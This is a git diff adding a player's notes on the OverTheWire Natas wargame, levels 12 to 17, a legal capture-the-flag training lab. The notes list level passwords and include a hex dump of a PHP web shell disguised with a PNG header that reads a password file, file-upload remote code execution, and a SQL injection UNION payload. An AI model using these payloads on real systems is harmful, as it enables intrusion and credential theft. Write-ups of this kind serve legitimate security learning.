@@ -39,3 +39,66 @@ U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 -v asdf /etc/natas_webpass/natas11
 
 Natas 12:
+EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+refer to natas12.php
+main exploit is using the fact that XOR inverse is XOR,
+so knowing the original data and the final data we can find the key
+
+Natas 13:
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+You can upload a php file, and run remote code execution
+ls : http://natas12.natas.labs.overthewire.org/upload/zfj1jokz1z.php
+ls ../ : http://natas12.natas.labs.overthewire.org/upload/qziweu00vh.php
+pass will prob be in /etc/natas_webpass/natas13
+cat /etc/natas_webpass/natas13 : http://natas12.natas.labs.overthewire.org/upload/3n3hwfp7jn.php
+Got it!
+
+Natas 14:
+
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+We can trick php exif_imagetype by adding the png magic header 89 50 4e 47 0d 0a 1a 0a
+the code has an exploit where you can change the filename to be whatever you want, so the extension of the
+file when saved will be whatever you want. We can change the extension of the file to be .php, then upload
+our suppoused png file (which actually has php code, just has the png magic which will just be rendered as
+null characters in the html)
+
+Keep in note: trying to edit the file with anything other than a hexeditor can change the data, removing the
+png magic header.
+
+Hex Dump of Natas14.png:
+
+00000000  89 50 4e 47 0d 0a 1a 0a  3c 3f 70 68 70 0a 2f 2f  |.PNG....<?php.//|
+00000010  20 70 61 73 73 74 68 72  75 28 22 6c 73 20 2e 2e  | passthru("ls ..|
+00000020  2f 22 29 0a 70 61 73 73  74 68 72 75 28 22 63 61  |/").passthru("ca|
+00000030  74 20 2f 65 74 63 2f 6e  61 74 61 73 5f 77 65 62  |t /etc/natas_web|
+00000040  70 61 73 73 2f 6e 61 74  61 73 31 34 22 29 0a 3f  |pass/natas14").?|
+00000050  3e 0a                                             |>.|
+
+ls : http://natas13.natas.labs.overthewire.org/upload/sinfug5lu4.php
+pass: http://natas13.natas.labs.overthewire.org/upload/v0i1idts1h.php
+
+How to figure this out?
+on the php documentation on exif_imagetype, it states it finds the image by:
+https://www.php.net/manual/en/function.exif-imagetype.php
+
+Description ¶
+exif_imagetype(string $filename): int|false
+exif_imagetype() reads the first bytes of an image and checks its signature.
+the important part being reads the first bytes of an image and checks its signature.
+
+Natas 15:
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+SQL injection: make password = " UNION SELECT * FROM users WHERE NOT username= "asdf
+
+Natas 16:
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+able to use SQL injection to lower down the possiblities when bruteforcing a password
+
+Natas 17:
+can do RCE using $()
+
